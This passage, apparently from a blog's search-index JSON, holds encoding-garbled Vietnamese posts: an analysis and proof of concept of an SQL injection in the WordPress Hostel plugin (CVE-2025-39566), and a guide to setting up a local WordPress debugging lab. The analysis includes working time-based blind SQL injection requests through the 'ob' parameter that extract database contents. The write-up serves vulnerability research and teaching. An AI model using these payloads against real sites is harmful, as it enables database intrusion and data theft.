thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ 